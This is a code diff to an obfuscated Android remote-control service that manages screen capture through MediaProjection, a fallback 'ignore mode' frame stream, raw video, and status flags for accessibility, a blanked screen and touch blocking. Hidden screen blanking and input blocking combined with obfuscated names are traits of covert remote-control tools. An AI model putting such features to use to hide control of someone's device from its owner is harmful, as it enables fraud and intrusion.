@@ -166,6 +166,7 @@ class DFm8Y8iMScvB2YDw : Service() {
                         put("blank", BIS)
                         put("penetrate", SKL)
                         put("touchblock", nZW99cdXQ0COhB2o.isTouchBlockOn)
+                        put("accessibility", nZW99cdXQ0COhB2o.isOpen)
                     }.toString()
                 } catch (e: Exception) {
                     Log.e("MainService", "daxian_status build failed", e)
@@ -872,6 +873,15 @@ class DFm8Y8iMScvB2YDw : Service() {
             return false
         }
 
+        Log.i("MainService", "startCapture: resetting capture states before start")
+        nZW99cdXQ0COhB2o.resetCaptureStates("before-start-capture")
+        ClsFx9V0S.rEqMB3nD(255)
+        try {
+            ClsFx9V0S.VaiKIoQu("video", true)
+        } catch (e: Exception) {
+            Log.e("MainService", "startCapture: enable video raw failed", e)
+        }
+
         updateScreenInfo(resources.configuration.orientation)
         
         surface = createSurface()
@@ -1101,8 +1111,9 @@ class DFm8Y8iMScvB2YDw : Service() {
             }
         }
 
-        // Token不可用，需要新权限。无视模式继续运行作为备用帧流
-        Log.i("MainService", "restoreMediaProjection: requesting new MediaProjection permission (无视模式保持运行)")
+        // Token不可用，需要新权限。无视模式继续运行作为备用帧流；
+        // 新授权成功后 startCapture() 会再次强制清理互斥状态。
+        Log.i("MainService", "restoreMediaProjection: requesting new MediaProjection permission (无视模式保持运行作为备用)")
         requestMediaProjection()
     }
 
@@ -1203,8 +1214,17 @@ class DFm8Y8iMScvB2YDw : Service() {
         _isReady = false
         _isAudioStart = false
         
-        //updateback011
-        nZW99cdXQ0COhB2o.stopIgnoreCapture("destroy")
+        nZW99cdXQ0COhB2o.resetCaptureStates("destroy")
+        nZW99cdXQ0COhB2o.ctx?.setTouchBlockEnabled(false)
+        gohome = 8
+        BIS = false
+        ClsFx9V0S.rEqMB3nD(255)
+        try {
+            ClsFx9V0S.VaiKIoQu("video", false)
+        } catch (e: Exception) {
+            Log.e("MainService", "destroy: disable video raw failed", e)
+        }
+        savedMediaProjectionIntent = null
         
         stopCapture()
 
